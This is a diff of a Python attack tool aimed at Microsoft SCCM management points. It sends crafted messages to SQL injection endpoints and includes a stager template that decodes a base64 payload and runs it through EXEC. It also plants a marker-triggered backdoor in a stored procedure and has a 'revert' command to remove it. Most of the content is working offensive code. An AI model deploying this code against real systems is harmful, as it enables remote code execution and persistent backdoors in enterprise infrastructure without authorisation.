@@ -1,22 +1,17 @@
 #!/usr/bin/env python3
 import argparse
 import gzip
+import importlib
 import logging
 import re
 import uuid
 import zlib
 from base64 import b64encode
+from json import loads
 
 import requests
 import urllib3
-from cryptography import x509
-from cryptography.hazmat.primitives import hashes, serialization
-from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
-from cryptography.x509 import ObjectIdentifier
-from cryptography.x509.oid import NameOID
 from requests_toolbelt import multipart
-import importlib
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -83,11 +78,10 @@ END
                 if part.headers[b'content-type'] == b'application/octet-stream':
                     deflatedData = zlib.decompress(part.content).decode('utf-16')
                     logging.debug(deflatedData)
+                return deflatedData
         except Exception as e:
-            logging.error(e)
-            deflatedData = ""
-            pass
-        return deflatedData
+            # logging.error(e)
+            return part.content
 
 
     def __ccm_system_request(self, header, request):
@@ -105,29 +99,11 @@ END
         request = b"%s\r\n" % request_body.encode('utf-16')[2:]
         header = self.tpl_msg.format(LENGTH=len(request) - 2, TARGET=self._target, TARGET_ENDPOINT="MP_LocationManager", MACHINE_ID=self.dummy_package_id)
         resp = self.__ccm_system_request(header, request)
-        r = re.findall("<SecurityConfiguration>([^<]+)</SecurityConfiguration>", resp)
-        if len(r):
-            match =  r[0]
-            logging.debug(f"Got Output")
-            output = loads(b64decode(match).decode(encoding='latin1', errors='backslashreplace'))[0]
-            logging.debug(output)
-            try:
-                self.rows = loads(output.get('rows', '[]'))
-            except:
-                self.rows = []
-            self.rowcount = output.get('rc', None)
-            self.error = output.get('err', None)
-            return self.rows
-        else:
-            logging.error("Failed to get output in response")
-            return None
+        if 'NoReply'.encode('utf-16-le') in resp :
+            print('[+] Reverted successfully')
+        else: 
+            print('[!] Revert failed or the backdoor is not present')
         
-    def do_check(self, sitecode):
-        request_body = self.tpl_SiteInformationRequest.format(SITECODE=sitecode)
-        request = b"%s\r\n" % request_body.encode('utf-16')[2:]
-        header = self.tpl_msg.format(LENGTH=len(request) - 2, TARGET=self._target, TARGET_ENDPOINT="MP_LocationManager", MACHINE_ID=self.dummy_package_id)
-        resp = self.__ccm_system_request(header, request)
-        print(resp)
 
 tpl_inject_stager = "DECLARE @s NVARCHAR(MAX)=(SELECT CAST(dbo.fnDecompressData(dbo.fnConvertBase64StringToBinary('{PAYLOAD}'))AS VARCHAR(max)));EXEC(@s)"
 
@@ -180,6 +156,7 @@ if __name__ == "__main__":
    
     revert_parser = subparsers.add_parser('revert', help="Revert the changes to the original SPO")
     revert_parser.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help="Override marker to trigger the backdoor (Default: ABC)")
+    revert_parser.add_argument("-a", "--altauth", action="store_true", required=False, default=False, help="Use the MP's alternate authentication endpoint (Default: False)")
 
 
     args = parser.parse_args()
@@ -191,8 +168,7 @@ if __name__ == "__main__":
         logging.getLogger().setLevel(logging.INFO)
 
     if args.command == 'revert':
-        sccm_sql_http = SCCM_SQL_HTTP(args.target, None, None)
-        sccm_sql_http.do_revert(args.marker)
+        SCCM_SQL_HTTP(args.target, None, None).do_revert(args.marker)
     else :
         try:
             # Dynamic import
